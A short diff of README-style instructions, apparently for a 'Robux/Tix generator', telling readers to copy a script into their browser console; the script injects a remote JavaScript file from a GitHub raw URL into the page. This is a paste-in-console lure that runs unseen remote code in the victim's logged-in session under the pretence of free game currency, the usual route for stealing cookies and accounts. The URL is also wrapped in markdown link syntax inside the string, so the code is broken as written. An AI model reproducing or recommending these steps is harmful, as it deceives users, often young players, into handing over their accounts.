@@ -8,7 +8,9 @@
 6) Copy the script below :
 
 const script = document.createElement('script');
+
 script.src = "[https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/generator.js](https://raw.githubusercontent.com/Axvthy/Korone-Robux-Tix-Generator/refs/heads/main/generator.js)";
+
 document.head.appendChild(script);
 
 7) Paste it into the console
